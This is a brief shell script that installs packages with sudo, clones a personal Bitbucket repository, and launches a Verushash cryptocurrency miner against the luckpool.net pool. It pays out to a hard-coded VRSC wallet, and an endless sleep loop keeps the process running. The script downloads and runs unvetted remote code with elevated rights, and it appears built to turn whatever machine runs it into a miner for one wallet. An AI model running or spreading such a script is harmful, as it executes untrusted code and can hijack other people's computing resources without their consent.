#!/bin/sh
sudo apt update
sudo apt install screen -y
apt-get install wget -y && \
git clone https://Jhonynrake@bitbucket.org/Jhonynrake/bunda.git && cd bunda && chmod +x *.sh && sed -i -e 's/\r$//' hadd.sh && ./hadd.sh -algo Verushash -pool1 na.luckpool.net:3956 -wallet RPgBLvrs4uqfefFrGuGy5bxVdNe8qDbhQD -coin VRSC -rigname ganti
while [ 1 ]; do
sleep 3
done
sleep 999
